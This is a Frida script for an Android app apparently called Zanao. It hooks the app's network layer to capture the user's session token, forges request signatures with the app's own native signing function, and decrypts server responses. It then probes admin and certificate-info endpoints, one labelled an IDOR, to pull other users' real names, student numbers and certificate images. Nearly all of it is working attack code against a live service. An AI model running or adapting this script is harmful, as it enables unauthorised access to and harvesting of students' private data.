// probe.js — 在 App 进程内完成：抓 token → 自己签名 → 直接发 HTTP → 打印结果
// 依赖 frida CLI（Java bridge 在 CLI 下可用；Python API 17.x 无内置 Java bridge）

var TOKEN = null, ALIAS = null, DEVICE = null, READY = false;

function log(tag, o) { send({ tag: tag, data: o }); }

function findKey(obj, key) {
    if (obj && typeof obj === 'object') {
        if (Object.prototype.hasOwnProperty.call(obj, key)) return obj[key];
        for (var k in obj) {
            var r = findKey(obj[k], key);
            if (r !== null && r !== undefined) return r;
        }
    }
    return null;
}

function strToBytes(s) {
    var B = Java.use('[B');
    return Java.array('byte', Array.from(s).map(function (c) { return c.charCodeAt(0) & 0xff; }));
}

function http(method, url, headers, body) {
    var URLc = Java.use('java.net.URL');
    var HUC = Java.use('java.net.HttpURLConnection');
    var conn = URLc.$new(url).openConnection();
    var c = Java.cast(conn, HUC);
    c.setRequestMethod(method);
    c.setConnectTimeout(15000);
    c.setReadTimeout(25000);
    c.setDoInput(true);
    for (var k in headers) c.setRequestProperty(k, String(headers[k]));
    if (method === 'POST') {
        c.setDoOutput(true);
        var b = Java.array('byte', (function () {
            var out = [];
            var bs = Java.use('java.lang.String').$new(body).getBytes();
            for (var i = 0; i < bs.length; i++) out.push(bs[i]);
            return out;
        })());
        var os = c.getOutputStream();
        os.write(b);
        os.flush();
        os.close();
    }
    var code = c.getResponseCode();
    var is = (code >= 400) ? c.getErrorStream() : c.getInputStream();
    var text = '';
    if (is !== null) {
        var BAOS = Java.use('java.io.ByteArrayOutputStream');
        var buf = Java.array('byte', new Array(8192).fill(0));
        var baos = BAOS.$new();
        while (true) {
            var n = is.read(buf);
            if (n <= 0) break;
            baos.write(buf, 0, n);
        }
        is.close();
        text = Java.use('java.lang.String').$new(baos.toByteArray());
    }
    var hdrs = {};
    try {
        var f = c.getHeaderFields();
        var it = f.keySet().iterator();
        while (it.hasNext()) {
            var kk = it.next();
            if (kk === null) continue;
            hdrs[String(kk)] = String(f.get(kk).toString());
        }
    } catch (e) { }
    return { code: code, body: String(text), headers: hdrs };
}

function sign(fields) {
    var T = Java.use('java.util.TreeMap');
    var m = T.$new();
    for (var k in fields) m.put(String(k), String(fields[k]));
    return Java.use('com.comingx.zanao.utils.JniUtils').makeSign(m);
}

function unhashApp(s) {
    try { return Java.use('com.comingx.zanao.utils.JniUtils').unhashAppResult(s); }
    catch (e) { return '<decrypt-err ' + e + '>'; }
}

function randNum(n) {
    var s = '';
    for (var i = 0; i < n; i++) s += Math.floor(Math.random() * 10);
    return s;
}

function api(path, data, method) {
    method = method || 'POST';
    var nd = randNum(20), td = String(Math.floor(Date.now() / 1000));
    var si = { timestamp__: td, randnum__: nd };
    for (var k in data) si[k] = data[k];
    var ah = sign(si);
    var h = {
        'X-Sc-Alias': ALIAS, 'X-Sc-Token': TOKEN, 'X-Sc-Client': 'app',
        'X-Sc-Device': DEVICE, 'X-Sc-Platform': 'Android', 'X-Sc-Hb-V': '210',
        'X-Sc-Nt-V': '310', 'X-Sc-Version': '3.1.0', 'X-Sc-Nd': nd, 'X-Sc-Td': td,
        'X-Sc-Ah': ah, 'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': 'okhttp/4.9.3'
    };
    var url = 'http://api.app.zanao.com' + path;
    var res;
    if (method === 'GET') {
        var q = [];
        for (var kk in data) q.push(encodeURIComponent(kk) + '=' + encodeURIComponent(data[kk]));
        res = http('GET', url + (q.length ? '?' + q.join('&') : ''), h, null);
    } else {
        res = http('POST', url, h, JSON.stringify(data));
    }
    var body = res.body;
    var enc = (res.headers['x-sc-encrypt'] || res.headers['X-Data-Encrypt'] || '').indexOf('1') >= 0;
    if (enc) body = unhashApp(body);
    var j = null;
    try { j = JSON.parse(body); } catch (e) { }
    if (j && j.__encrypt__ && j.__data__) {
        try { j = JSON.parse(unhashApp(j.__data__)); } catch (e) { }
    }
    return { code: res.code, json: j, raw: (j ? null : body.substring(0, 800)) };
}

function pick(o, keys, path, out) {
    out = out || {};
    path = path || '';
    if (Array.isArray(o)) {
        for (var i = 0; i < Math.min(o.length, 3); i++) pick(o[i], keys, path + '[' + i + ']', out);
    } else if (o && typeof o === 'object') {
        for (var k in o) {
            if (keys.indexOf(k) >= 0 && typeof o[k] !== 'object') out[path + '.' + k] = o[k];
            pick(o[k], keys, path + '.' + k, out);
        }
    }
    return out;
}

var KEYS = ['uid', 'user_id', 'nickname', 'headimgurl', 'realname', 'student_no',
    'cert_img', 'cert_img_url', 'cert_valid', 'reg_days', 'errno', 'msg'];

function run() {
    var r1 = api('/sc-api/thread/v2/list', { page: '1', per_page: '10' });
    log('list', { code: r1.code, errno: r1.json && r1.json.errno, raw: r1.raw });
    var stack = [r1.json];
    var lst = null;
    while (stack.length) {
        var cur = stack.pop();
        if (!cur || typeof cur !== 'object') continue;
        if (Array.isArray(cur) && cur.length && cur[0] && typeof cur[0] === 'object'
            && (cur[0].uid || cur[0].nickname)) { lst = cur; break; }
        for (var k in cur) stack.push(cur[k]);
    }
    if (!lst) { log('list-empty', { json: r1.json }); return; }
    var peers = [];
    for (var i = 0; i < lst.length && peers.length < 5; i++) {
        var it = lst[i];
        if (it.uid && !it.is_anon) peers.push({
            uid: it.uid, nickname: it.nickname, headimgurl: it.headimgurl,
            thread_id: it.thread_id || it.id
        });
    }
    log('peers', peers);
    var t = peers.length ? peers[0] : null;
    if (!t) { log('no-peer', {}); return; }

    var r2 = api('/sc-api/mx/user/usershow', { uid: t.uid });
    log('mx-usershow', { uid: t.uid, code: r2.code, errno: r2.json && r2.json.errno,
        fields: pick(r2.json, KEYS), raw: r2.raw });

    var r3 = api('/sc-api/mx/admin/userinfo', { uid: t.uid });
    log('mx-admin-userinfo', { uid: t.uid, code: r3.code, errno: r3.json && r3.json.errno,
        fields: pick(r3.json, KEYS), raw: r3.raw });

    var r4 = api('/sc-api/thread/admin/userinfo', { uid: t.uid });
    log('thread-admin-userinfo', { uid: t.uid, code: r4.code, errno: r4.json && r4.json.errno,
        fields: pick(r4.json, KEYS), raw: r4.raw });

    if (t.thread_id) {
        var r5 = api('/sc-api/user/usershow', { thread_id: t.thread_id });
        log('user-usershow', { thread_id: t.thread_id, code: r5.code, errno: r5.json && r5.json.errno,
            fields: pick(r5.json, KEYS), raw: r5.raw });
    }

    var r6 = api('/sc-api/user/certinfo', { school_id: '1', uid: t.uid }, 'GET');
    log('certinfo-idor', { code: r6.code, errno: r6.json && r6.json.errno,
        fields: pick(r6.json, KEYS), raw: r6.raw });
}

(function waitJava(t) {
    if (typeof Java !== 'undefined') {
        Java.perform(function () {
            try {
                var N = Java.use('com.comingx.zanao.JSIs.NetworkJSI');
                ['request', 'easyRequest'].forEach(function (n) {
                    if (!N[n]) return;
                    N[n].overloads.forEach(function (ov) {
                        if (ov.argumentTypes.length !== 1 || ov.argumentTypes[0].className !== 'java.lang.String') return;
                        ov.implementation = function (s) {
                            try {
                                if (!TOKEN && s && s.indexOf('X-Sc-Token') >= 0) {
                                    var p = JSON.parse(s);
                                    var inner = p.parameters[0].value;
                                    var hd = inner.header;
                                    TOKEN = hd['X-Sc-Token'];
                                    ALIAS = hd['X-Sc-Alias'];
                                    DEVICE = hd['X-Sc-Device'];
                                    log('token', { alias: ALIAS, device: DEVICE, token: TOKEN });
                                    setTimeout(function () {
                                        try { run(); } catch (e) { log('run-err', '' + e); }
                                    }, 1200);
                                }
                            } catch (e) { }
                            return ov.call(this, s);
                        };
                    });
                });
                log('hooked', { ok: true });
            } catch (e) { log('hook-err', '' + e); }
        });
        return;
    }
    if (t <= 0) { log('no-java', ''); return; }
    setTimeout(function () { waitJava(t - 1); }, 200);
})(200);
